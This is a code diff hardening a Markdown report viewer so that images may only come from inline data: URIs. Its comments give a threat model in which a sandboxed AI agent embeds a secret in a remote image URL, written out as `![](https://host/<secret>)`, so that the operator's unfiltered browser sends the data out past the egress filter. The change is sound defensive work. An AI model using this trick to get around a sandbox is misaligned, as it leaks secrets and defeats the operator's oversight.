@@ -55,9 +55,25 @@ const ALLOWED_TAGS = new Set([
 // property that matters most here.
 const LINK_SCHEMES = new Set(['http:', 'https:', 'mailto:']);
 
-// Images may additionally come from a self-contained data: URI, restricted to
-// the raster types the notification image preview already trusts. No SVG: it
+// An image may ONLY come from a self-contained data: URI, restricted to the
+// raster types the notification image preview already trusts. No SVG: it
 // carries script.
+//
+// This is the one place the viewer is deliberately stricter than a general
+// Markdown renderer, and the reason is specific to what tclaude is. An <img>
+// is the only thing in a document that reaches the network on its own, with no
+// click — and the document's author is an agent that may be running behind
+// this project's own egress boundary (see docs/linux-network-filtering.md:
+// default-drop nftables plus a DNS broker admitting only authored names). A
+// remote src would let such an agent write `![](https://host/<secret>)`, wait
+// for the operator to open the report, and have the operator's UNFILTERED
+// browser make the request the agent could not — turning the viewer into a
+// way around the sandbox the operator configured. `referrerpolicy` does not
+// help: it hides which host asked, not that the request happened at all.
+//
+// Inline data: images keep documents genuinely illustrated while staying
+// local, which is the same offline property the vendored parser exists for. A
+// remote image degrades to its alt text (see imageNode).
 const DATA_IMAGE = /^data:image\/(?:gif|png|jpeg|webp);base64,[a-z0-9+/]+=*$/i;
 
 // Table-cell alignment is the one inline style markdown-it emits.
@@ -70,7 +86,11 @@ const LANGUAGE_CLASS = /^language-[a-z0-9_.+-]{1,32}$/i;
 function safeURL(value, { image = false } = {}) {
   const raw = String(value ?? '').trim();
   if (!raw) return null;
-  if (image && DATA_IMAGE.test(raw)) return raw;
+  // An image source is inline or it is nothing — no scheme parsing, because no
+  // scheme is acceptable. A relative src is refused for the same reason a
+  // relative href is, with the extra weight that an image would fetch it
+  // against the dashboard's own origin without the operator clicking anything.
+  if (image) return DATA_IMAGE.test(raw) ? raw : null;
   let parsed;
   try {
     // Parsed with NO base, so only an absolute URL naming its own scheme
@@ -84,7 +104,6 @@ function safeURL(value, { image = false } = {}) {
   } catch {
     return null;
   }
-  if (image) return parsed.protocol === 'http:' || parsed.protocol === 'https:' ? raw : null;
   return LINK_SCHEMES.has(parsed.protocol) ? raw : null;
 }
 
@@ -108,15 +127,12 @@ function attributesFor(tag, attrs) {
     return out;
   }
   if (tag === 'img') {
+    // Inline-only by policy (see DATA_IMAGE), so the src never reaches the
+    // network and carries no referrer to suppress.
     const src = safeURL(source.get('src'), { image: true });
     if (!src) return out;
     out.src = src;
     out.loading = 'lazy';
-    // A remote image is the one thing in a document that reaches the network
-    // on its own, without the operator clicking anything. It stays supported,
-    // but it does not get to learn which dashboard host asked for it: the
-    // daemon's whole attachment design keeps its address off the wire.
-    out.referrerpolicy = 'no-referrer';
     return out;
   }
   if (tag === 'ol') {
